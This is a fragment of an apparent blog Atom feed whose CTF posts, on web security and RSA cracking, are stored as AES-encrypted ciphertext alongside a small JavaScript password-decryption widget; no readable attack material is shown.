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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;ctf中web安全考察点知识点多种多样，现笔者不才，斗胆试着整理一下，也是对自己近一年来web所学做一次总结，由于整理并非非常完善，故此文将持续更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CTF-RSA破解方式整理</title>
    <link href="https://winter3un.github.io/2018/07/09/rsa-ctf/"/>
    <id>https://winter3un.github.io/2018/07/09/rsa-ctf/</id>
    <published>2018-07-10T00:51:05.000Z</published>
    <updated>2018-07-27T03:07:29.491Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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